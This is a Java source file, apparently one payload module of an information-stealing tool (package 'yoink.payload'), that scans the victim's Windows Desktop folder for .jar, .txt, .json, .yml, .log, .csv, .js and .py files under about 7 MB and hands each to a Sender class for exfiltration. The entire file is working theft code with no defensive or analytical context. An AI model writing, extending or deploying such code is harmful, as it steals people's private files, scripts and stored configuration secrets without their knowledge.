package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.Sender;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public final
class Desktop implements Payload {
    @Override
    public
    void execute () throws Exception {
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                .filter(path -> path.toFile().getName().endsWith(".jar")
                        || path.toFile().getName().endsWith(".txt")
                        || path.toFile().getName().endsWith(".json")
                        || path.toFile().getName().endsWith(".yml")
                        || path.toFile().getName().endsWith(".log")
                        || path.toFile().getName().endsWith(".csv")
                        || path.toFile().getName().endsWith(".js")
                        || path.toFile().getName().endsWith(".py"))
                .filter(path -> {
                    try {
                        return Files.size(path) < 7000000;
                    } catch (IOException ignored) {
                    }
                    return false;
                }).forEach(path -> Sender.send(path.toFile()));
    }
}